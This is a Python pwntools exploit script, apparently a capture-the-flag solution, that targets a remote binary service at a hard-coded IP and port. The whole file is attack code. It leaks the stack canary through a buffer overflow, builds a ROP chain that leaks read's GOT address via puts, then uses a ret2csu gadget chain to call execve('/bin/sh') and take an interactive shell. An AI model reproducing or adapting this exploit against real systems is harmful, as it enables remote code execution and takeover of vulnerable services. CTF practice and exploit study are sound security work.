#/usr/env/bin python
from pwn import *
target = remote('106.75.66.195',20000)
#target = process('./easypwn_0F2F68BE87E2457FA8223AC4A0CDACB1')
payload = 72 * 'A'

target.recvuntil("Who are you?")

target.sendline(payload)
target.recvuntil('A'* 72)
canary = u64(target.recv(8)) - 0xa
log.info('canary: ' + hex(canary))
#leak canary

plt_puts = 0x400560
pop_rdi_ret = 0x4007f3
got_read = 0x601030
target.recvuntil('tell me your real name?\n')
payload = 'A' * 72 
payload += p64(canary)
payload += 'A' * 0x8
payload += p64(pop_rdi_ret)
payload += p64(got_read)
payload += p64(plt_puts)
payload += p64(0x4006C6)
target.sendline(payload)
target.recvuntil('See you again!\n')
addr_read = u64(target.recvuntil('\n',drop = True).ljust(0x8,'\x00'))
log.info('addr_read: ' + hex(addr_read))

#leak addr_read

#elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# off_read = elf.symbols['read']
# offset = addr_read - off_read
# syscall = elf.symbols['system'] + offset
syscall = addr_read + 0xe
log.info('syscall: ' + hex(syscall))
target.recvuntil('Who are you?\n')
target.sendline('A'*(0x50-0x8))
#gdb.attach(target,'b *0x4007d0')
#execve("/bin/sh",NULL,NULL)
target.recvuntil('tell me your real name?\n')
payload = 'A'*(0x50-0x8)
payload += p64(canary)
payload += 'A'*0x8
#gdb.attach(target,'b *0x4007EA')
payload += p64(0x4007EA) # pop rbx |pop rbp |pop r12 |pop r13|pop r14 pop r15 ret
payload += p64(0)+p64(1)+p64(got_read)+p64(0x3B)+p64(0x601080)+p64(0)
# rbx=0|rbp=1|r12=got_read|r13=0x3B|r14=0x601080|r15=0|ret
payload += p64(0x4007D0)  # mov rdx,r13|mov rsi,r14|mov edi,r15|callq  *(r12,rbx,8)
# rdx=0x3B|rsi=0x601080|edi=0|call r12
payload += p64(0)
payload += p64(0)+p64(1)+p64(0x601088)+p64(0)+p64(0)+p64(0x601080)
payload += p64(0x4007D0)
target.send(payload)
content = '/bin/sh\x00'+p64(syscall)
content = content.ljust(0x3B,'A')
target.send(content)
target.interactive()